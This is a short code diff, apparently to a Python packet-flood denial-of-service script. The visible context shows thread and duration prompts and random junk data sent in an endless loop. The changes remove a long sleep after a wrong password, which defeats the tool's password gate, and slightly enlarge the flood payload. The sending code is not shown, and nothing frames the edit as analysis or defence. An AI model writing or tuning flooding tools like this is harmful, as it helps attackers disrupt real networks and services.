@@ -16,7 +16,7 @@ if password == "v7":
     time.sleep(3)
 else :
     print("WRONG PASS!")
-    time.sleep(100000000000000000000000000000)
+    time.sleep(3)
     
 os.system("clear")
 
@@ -31,7 +31,7 @@ times = int(input("[/] Time : "))
 threads = int(input("[/] Thread : "))
 
 def run():
-    data = random._urandom(9000)
+    data = random._urandom(9024)
     i = random.choice(("[*]","[!]","[#]"))
     while True:
         try:
